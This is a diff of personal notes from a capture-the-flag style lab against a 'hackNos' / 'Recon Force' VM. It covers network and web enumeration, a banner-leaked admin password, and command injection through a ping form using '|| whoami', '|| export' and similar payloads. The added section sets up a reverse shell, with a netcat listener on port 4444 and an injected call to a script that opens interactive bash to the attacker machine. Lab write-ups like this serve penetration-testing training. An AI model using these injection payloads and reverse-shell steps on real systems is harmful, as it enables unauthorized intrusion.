@@ -1,56 +1,65 @@
 1) Enumeration: 
 	- VM IP: sudo netdiscover
-		* VMWare 192.168.1.12
-	- VM info: nmap -A 192.168.1.12
+		* VMWare 192.168.0.12
+	- VM info: nmap -A 192.168.0.12
 		* 21/tcp open  ftp  
 			Anonymous log-in is on. --> banner "ftp 'Security@hackNos'"
 		* 22/tcp open  ssh
 		* 80/tcp open  http
 
-	- web server info: dirb -w http://192.168.1.12 & 
-		* http://192.168.1.12/index.html
-		* http://192.168.1.12/css/style.css
-		* http://192.168.1.12/css/2.jpg
+	- web server info: dirb -w http://192.168.0.12 & 
+		* http://192.168.0.12/index.html
+		* http://192.168.0.12/css/style.css
+		* http://192.168.0.12/css/2.jpg
 
-	- web server 192.168.1.12/5ecure login using the :
+	- web server 192.168.0.12/5ecure login using the :
 		* admin:Security@hackNos <-- Banner
 
-	- web server info: dirb -w http://192.168.1.12/5ecure		
-		* http://192.168.1.12/5ecure/index.html
+	- web server info: dirb -w http://192.168.0.12/5ecure		
+		* http://192.168.0.12/5ecure/index.html
 			form POSTs data to output.php
-		* http://192.168.1.12/5ecure/css/style.css
-		* http://192.168.1.12/5ecure/css/2.jpg
-		* http://192.168.1.12/5ecure/output.php
+		* http://192.168.0.12/5ecure/css/style.css
+		* http://192.168.0.12/5ecure/css/2.jpg
+		* http://192.168.0.12/5ecure/output.php
 			simple ping <ip> function
 
 2) Pene:
-	- 192.168.1.12/5ecure/out.php -> exec(ping $ip) -> injection 
-		* $ip = || command 
-			';/&&/& + command' didn't work, char escape or header conflict
-	- ip=|| whoami 
-		* www-data
-	- ip=|| export
-		* export APACHE_LOCK_DIR='/var/lock/apache2'
-		* export APACHE_LOG_DIR='/var/log/apache2'
-		* export APACHE_PID_FILE='/var/run/apache2/apache2.pid'
-		* export APACHE_RUN_DIR='/var/run/apache2'
-		* export APACHE_RUN_GROUP='www-data'
-		* export APACHE_RUN_USER='www-data'
-		* export INVOCATION_ID='e514c3c1dbef4f068ab8124007ec59a6'
-		* export JOURNAL_STREAM='9:21541'
-		* export LANG='C'
-		* export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin'
-		* export PWD='/var/www/recon/5ecure'		
-	- ip=|| ls 
-		* system navigation
-	- ip=|| vi *file*
-		* privilege check
+	- 192.168.0.12/5ecure/out.php -> exec(ping $ip) -> injection 
+		* $ip = || command  # /&&/& + command' didn't work, char escape or header conflict
+		- ip=|| whoami 
+			* www-data
+		- ip=|| export
+			* export APACHE_LOCK_DIR='/var/lock/apache2'
+			* export APACHE_LOG_DIR='/var/log/apache2'
+			* export APACHE_PID_FILE='/var/run/apache2/apache2.pid'
+			* export APACHE_RUN_DIR='/var/run/apache2'
+			* export APACHE_RUN_GROUP='www-data'
+			* export APACHE_RUN_USER='www-data'
+			* export INVOCATION_ID='e514c3c1dbef4f068ab8124007ec59a6'
+			* export JOURNAL_STREAM='9:21541'
+			* export LANG='C'
+			* export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin'
+			* export PWD='/var/www/recon/5ecure'		
+		- ip=|| ls 
+			* system navigation
+		- ip=|| vi *file*
+			* privilege check
 
+		- intresting files:
+			* /var/opt/python.py
+			* /etc/passwd
 
-	- intresting files:
-		* /var/opt/python.py
-		* /etc/passwd
-			
+2b) CLI access
+	- python.py on Recon Force server is creating a connection to 192.168.0.104:4444 and runs an interactive bash.
+	- configurate host/attacking machine network settings
+		* add a new network connection and manualy set it up:
+			- IP: 192.168.0.104
+			- Netmask: 255.255.255.0
+			- Gateway: 192.168.0.1
+			- connect to the network using the new interface
+	- run nc -lvp 4444 to initiate a listener on 4444
+	- on 192.168.0.12/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
+
 
 
 
